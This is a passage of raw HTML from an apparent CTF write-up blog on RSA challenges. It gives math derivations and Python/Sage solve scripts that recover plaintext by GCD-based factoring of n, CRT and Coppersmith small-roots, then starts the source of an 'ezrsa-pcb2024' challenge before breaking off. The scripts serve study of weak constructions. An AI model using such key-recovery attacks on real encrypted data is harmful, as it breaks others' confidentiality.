mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.23692em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><msup><mo stretchy="false">]</mo><mi>n</mi></msup><mo></mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c2[0]^{n}\equiv c2[1]mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><mi>p</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>n</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo></mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=GCD(pow(c2[0],n,n)-c2[1],n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">m</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line">c2 = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>,</span><br><span class="line">      <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(c2[<span class="number">0</span>], n, n)-c2[<span class="number">1</span>], n)</span><br><span class="line">q = n // p</span><br><span class="line">flag = crt([p, q], [c2[<span class="number">0</span>], c2[<span class="number">1</span>]])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag[<span class="number">0</span>]).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mn>2</mn><mtext></mtext></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord">2</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">c2[0]=m+k_{1}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mi>q</mi></mrow><annotation encoding="application/x-tex">c2[1]=m+k_{2}q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>:</mo><mtext></mtext><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo></mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mi>q</mi><mo stretchy="false">)</mo><mo></mo><mi>m</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo></mo><msub><mi>k</mi><mn>2</mn></msub><mi>q</mi></mrow><annotation encoding="application/x-tex">1:\ c2[0]*c2[1]=m^{2}+(k_{1}p+k_{2}q)*m+k_{1}p*k_{2}q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>:</mo><mtext></mtext><mi>m</mi><mo></mo><mo stretchy="false">(</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>+</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn><mo></mo><msup><mi>m</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mi>q</mi><mo stretchy="false">)</mo><mo></mo><mi>m</mi></mrow><annotation encoding="application/x-tex">2:\ m*(c2[0]+c2[1])=2*m^{2}+(k_{1}p+k_{2}q)*m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo></mo><mn>2</mn><mo>:</mo><mtext></mtext><msup><mi>m</mi><mn>2</mn></msup><mo></mo><mi>m</mi><mo></mo><mo stretchy="false">(</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>+</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>+</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo></mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo></mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1-2:\ m^{2}-m*(c2[0]+c2[1])+c2[0]*c2[1]\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P,Q = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>, <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = m^<span class="number">2</span> - (P+Q)*m + P*Q</span><br><span class="line">x0 = f.small_roots()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x0[<span class="number">0</span>])).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ezrsa-pcb2024"><a class="markdownIt-Anchor" href="#ezrsa-pcb2024"></a> ezrsa-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_flag</span>(<span class="params">flag, bits=<span class="number">1024</span></span>):</span><br><span class="line">    pad = os.urandom(bits//<span class="number">8</span> - <span class="built_in">len</span>(flag))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(flag + pad, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[<span class="number">1</span>:]] </span><br><span class="line">a,b = [randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[:-<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = pad_flag(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span 